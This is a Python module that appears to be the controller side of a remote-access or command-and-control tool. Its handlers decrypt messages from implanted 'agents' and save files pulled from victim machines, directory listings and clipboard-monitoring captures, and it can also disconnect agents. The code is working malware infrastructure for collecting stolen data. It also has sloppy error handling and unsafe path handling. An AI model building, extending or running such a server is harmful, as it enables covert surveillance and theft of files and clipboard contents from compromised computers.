import json
import os
from pathlib import Path
import Logic.Agents.AgentsLogic as agentLogic
import Gateways.WebSocketCybClientGateway as webSocketCybClientGateway
from Utils import CryptoUtils


async def handle_file_upload(data: bytes, ip_address: str):
    agent = agentLogic.get_agent_by_ip_address(ip_address)

    try:
        message = CryptoUtils.decrypt(data, agent.encryption_key)
    except():
        return

    decompressed_message = CryptoUtils.decompress(message)
    decoded_message = CryptoUtils.decode_ascii(decompressed_message)

    json_message = json.loads(decoded_message)

    status = json_message['status']
    command_id = json_message['command_id']
    if status == 'fail':
        await webSocketCybClientGateway.send_message(f"Failed to execute command {command_id}. "
                                                     f"Cannot read given file")
        return

    file_data = json_message['data']
    file_path = json_message['file_path']

    if file_path[0] == '/':
        file_path = file_path[1:]

    parent_path = Path(__file__).parents[2]
    full_path = f'{parent_path}/downloads/{agent.id}/{file_path}'

    path, filename = os.path.split(full_path)

    path_exists = os.path.exists(path)

    if not path_exists:
        os.makedirs(path)

    with open(full_path, 'w') as f:
        f.write(file_data)

    await webSocketCybClientGateway.send_message(f"Command {command_id} executed."
                                                 f" File {filename} saved in {path}")


async def handle_file_list(data: bytes, ip_address: str):
    agent = agentLogic.get_agent_by_ip_address(ip_address)

    try:
        message = CryptoUtils.decrypt(data, agent.encryption_key)
    except():
        return

    decompressed_message = CryptoUtils.decompress(message)
    decoded_message = CryptoUtils.decode_ascii(decompressed_message)

    json_message = json.loads(decoded_message)

    data = json_message['data']
    dir_path = json_message['dir_path']
    command_id = json_message['command_id']

    parent_path = Path(__file__).parents[2]
    full_path = f'{parent_path}/downloads/{agent.id}/file_listing/{command_id}.txt'

    path, filename = os.path.split(full_path)

    path_exists = os.path.exists(path)

    data_to_save = f"Files from {dir_path} \n" + data

    if not path_exists:
        os.makedirs(path)

    with open(full_path, 'w') as f:
        f.write(data_to_save)

    await webSocketCybClientGateway.send_message(f"Command {command_id} executed."
                                                 f" File lists from {dir_path} saved in {full_path}")


async def handle_clipboard_monitor(data: bytes, ip_address: str):
    agent = agentLogic.get_agent_by_ip_address(ip_address)

    try:
        message = CryptoUtils.decrypt(data, agent.encryption_key)
    except():
        return

    decompressed_message = CryptoUtils.decompress(message)
    decoded_message = CryptoUtils.decode_ascii(decompressed_message)

    json_message = json.loads(decoded_message)

    data = json_message['data']
    command_id = json_message['command_id']

    parent_path = Path(__file__).parents[2]
    full_path = f'{parent_path}/downloads/{agent.id}/clipboard_monitor/{command_id}'

    path, filename = os.path.split(full_path)

    path_exists = os.path.exists(path)

    if not path_exists:
        os.makedirs(path)

    with open(full_path, 'w') as f:
        f.write(data)

    await webSocketCybClientGateway.send_message(f"Command {command_id} executed."
                                                 f" Clipboard monitoring results saved in {full_path}")


async def handle_disconnect_agent(data: bytes, ip_address: str):
    agent = agentLogic.get_agent_by_ip_address(ip_address)

    try:
        message = CryptoUtils.decrypt(data, agent.encryption_key)
    except():
        return

    decompressed_message = CryptoUtils.decompress(message)
    decoded_message = CryptoUtils.decode_ascii(decompressed_message)

    json_message = json.loads(decoded_message)

    command_id = json_message['command_id']

    agentLogic.disconnect_agent(agentLogic.DisconnectAgentInputType(ip_address=agent.ip_address))

    await webSocketCybClientGateway.send_message(f"Command {command_id} executed."
                                                 f" Agent {agent.ip_address} disconnected")
